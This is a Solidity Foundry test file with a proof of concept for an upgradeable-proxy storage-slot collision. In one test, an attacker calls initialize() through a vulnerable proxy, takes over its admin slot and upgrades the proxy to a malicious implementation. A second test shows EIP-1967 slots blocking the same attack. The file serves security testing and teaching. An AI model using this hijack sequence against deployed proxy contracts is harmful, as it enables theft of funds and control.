// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Logic, VulnerableProxy, SafeProxy} from "../src/proxy/Proxy.sol";

/// PoC for the upgradeable-proxy storage-slot collision (Audius-class, ~$6M, 2022-07).
///   forge test --match-contract ProxyCollision -vvv
///
/// Invariant (proxy): no implementation state variable may share a storage slot with the proxy's
/// admin/implementation pointers. The vulnerable proxy keeps admin in sequential slot 0, which
/// Logic.owner also occupies — so calling initialize() through the proxy overwrites admin.
/// EIP-1967 unstructured slots hold.
///
/// See docs/exploits/proxy-storage-collision-2022-07.md
contract ProxyCollisionTest is Test {
    Logic logic;
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    address evilImpl = makeAddr("evilImpl");

    function setUp() public {
        logic = new Logic();
    }

    function test_vulnerableProxy_adminHijackedByCollision() public {
        vm.prank(deployer);
        VulnerableProxy proxy = new VulnerableProxy(address(logic));
        assertEq(proxy.admin(), deployer, "deployer starts as admin");

        // Attacker calls Logic.initialize(attacker) THROUGH the proxy. delegatecall writes slot 0
        // of the proxy -> overwrites `admin`.
        vm.prank(attacker);
        Logic(address(proxy)).initialize(attacker);

        assertEq(proxy.admin(), attacker, "admin slot overwritten via storage collision");

        // Now the attacker, as admin, can hijack the implementation pointer.
        vm.prank(attacker);
        proxy.upgrade(evilImpl);
        assertEq(proxy.implementation(), evilImpl, "attacker upgraded to a malicious impl");
    }

    function test_safeProxy_unstructuredSlotsResistCollision() public {
        vm.prank(deployer);
        SafeProxy proxy = new SafeProxy(address(logic));
        assertEq(proxy.admin(), deployer, "deployer starts as admin");

        // Same attack: write Logic.owner (slot 0) through the proxy.
        vm.prank(attacker);
        Logic(address(proxy)).initialize(attacker);

        // admin lives in an EIP-1967 slot, untouched by the slot-0 write.
        assertEq(proxy.admin(), deployer, "admin unaffected by impl slot-0 write");

        // Attacker cannot upgrade.
        vm.prank(attacker);
        vm.expectRevert(bytes("not admin"));
        proxy.upgrade(evilImpl);
    }
}
